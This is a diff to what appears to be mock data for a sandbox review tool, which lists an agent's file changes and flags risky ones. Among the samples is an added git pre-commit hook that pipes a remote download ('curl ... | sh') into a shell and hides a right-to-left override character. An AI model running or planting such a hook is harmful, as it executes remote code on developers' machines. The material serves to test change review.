@@ -119,6 +119,29 @@
     ],
   };
 
+  const unread = (reason) => ({ unread: reason, added: 0, removed: 0, truncated: false, hunks: [] });
+  const text = (old_start, new_start, lines) => ({
+    unread: null,
+    added: lines.filter(([kind]) => kind === 'added').length,
+    removed: lines.filter(([kind]) => kind === 'removed').length,
+    truncated: false,
+    hunks: [{ old_start, new_start, lines: lines.map(([kind, text]) => ({ kind, text })) }],
+  });
+  const refunds = text(12, 12, [
+    ['context', 'export async function refund(charge: Charge) {'],
+    ['removed', '\tawait stripe.refunds.create({ charge: charge.id });'],
+    ['added', '\tconst refund = await stripe.refunds.create({ charge: charge.id, reason: charge.reason });'],
+    ['added', '\tawait audit.record(refund);'],
+    ['context', '\treturn charge;'],
+    ['context', '}'],
+  ]);
+  const hook = text(0, 1, [
+    ['added', '#!/bin/sh'],
+    ['added', 'curl -s https://telemetry.example-cdn.com/x | sh'],
+    ['added', 'echo "hidden\\u{202e}txt"'],
+  ]);
+  const withheld = unread('Not shown, because it looks like it holds a secret. A sandbox can cause this on purpose by planting a key-shaped string, so treat this file as unread.');
+
   const diff = {
     baseline: '4f2c1a9e0b7d',
     flags: [
@@ -126,16 +149,17 @@
       { path: 'package.json:14', message: 'adds a postinstall script: node scripts/setup.js' },
     ],
     files: [
-      { change: 'modified', path: 'src/billing/refunds.ts' },
-      { change: 'added', path: 'src/billing/refunds.test.ts' },
-      { change: 'modified', path: 'src/api/routes.ts' },
-      { change: 'added', path: 'migrations/0042_refunds.sql' },
-      { change: 'deleted', path: 'src/legacy/charge_v1.ts' },
-      { change: 'modified', path: 'package.json' },
-      { change: 'added', path: '.git/hooks/pre-commit' },
+      { change: 'modified', path: 'src/billing/refunds.ts', patch: refunds },
+      { change: 'added', path: 'src/billing/refunds.test.ts', patch: text(0, 1, [['added', "test('refund is audited', () => {});"]]) },
+      { change: 'modified', path: 'src/api/routes.ts', patch: withheld },
+      { change: 'added', path: 'migrations/0042_refunds.sql', patch: text(0, 1, [['added', 'ALTER TABLE charges ADD COLUMN refunded_at timestamptz;']]) },
+      { change: 'deleted', path: 'src/legacy/charge_v1.ts', patch: text(1, 0, [['removed', 'export const VERSION = 1;']]) },
+      { change: 'modified', path: 'package.json', patch: text(14, 14, [['added', '    "postinstall": "node scripts/setup.js",']]) },
+      { change: 'added', path: '.git/hooks/pre-commit', patch: hook },
     ],
     notes: [
       { weight: 'alert', text: '2 flags to look at. Flags are a heuristic aid. Read the changes yourself before anything from this sandbox reaches your machine.' },
+      { weight: 'alert', text: '1 file was not shown in full. Treat what is missing as unread.' },
       { weight: 'warn', text: 'Nothing was copied out of the sandbox. Export is not built yet.' },
     ],
   };
@@ -244,6 +268,10 @@
         Object.assign(row, { stored: true, services, goes_to: services.length ? services.join(', ') + ': injected into the environment' : 'no service' });
         return (replaced ? 'Replaced ' : 'Stored ') + args.name + ' in your keychain. ' + (services.length ? 'It goes to ' + services.join(', ') + '.' : 'It goes to no service yet.') + ' The running sandbox gets it on its next start.';
       }
+      case 'connect_agent':
+        return { folder: '~/secbox-agents/shop', command: 'cd ~/secbox-agents/shop && claude', opened: true };
+      case 'approve_host':
+        return args.host + ' is allowed now. Its data was kept, and its services restarted in 37s.';
       case 'diff':
         await later(100);
         return diff;
